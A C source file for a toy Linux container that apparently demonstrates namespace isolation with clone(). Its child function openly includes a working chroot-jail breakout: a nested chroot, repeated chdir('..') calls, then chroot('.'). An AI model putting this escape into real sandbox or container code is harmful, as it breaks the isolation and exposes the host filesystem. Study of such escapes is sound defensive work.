#define _GNU_SOURCE
#include <sched.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mount.h>
#include <string.h>
#include <sys/stat.h>

#define STACK_SIZE 65536

struct child_config {
  int argc;
  char **argv;
};

/* Entry point for child after `clone` */
int child(void *arg) {
  struct child_config *config = arg;
  char *envp[] = { "PATH=/bin:/usr/bin", NULL };

  if (chroot("/new_root") != 0) {
    printf("chroot error code: %d\n", errno);
  };
  chdir("/");

  // break out of chroot jail
  mkdir ("chroot-dir", 0755);
  chroot("chroot-dir");
  for (int i = 0; i < 1000; i++) {
    chdir("..");
  }
  chroot(".");

  sethostname("mycontainer", strlen("mycontainer"));

  if (execvpe(config->argv[0], config->argv, envp)) {
    fprintf(stderr, "execvpe failed %m.\n");
    return -1;
  }
  return 0;
}


int main(int argc, char**argv) {
  struct child_config config = {0};
  int flags = 0;
  pid_t child_pid = 0;

  // Prepare child configuration,
  // command will be run as sudo
  config.argc = argc - 1;
  config.argv = &argv[1];

  // Allocate stack for child
  char *stack = 0;
  if (!(stack = malloc(STACK_SIZE))) {
    fprintf(stderr, "Malloc failed");
    exit(1);
  }

  flags = flags | SIGCHLD | CLONE_NEWNET | CLONE_NEWPID | CLONE_NEWIPC | CLONE_NEWUTS;

  // Clone parent, enter child code
  if ((child_pid = clone(child, stack + STACK_SIZE, flags, &config)) == -1) {
    fprintf(stderr, "Clone failed");
    exit(2);
  }

  wait(NULL);
  
  return 0;
}
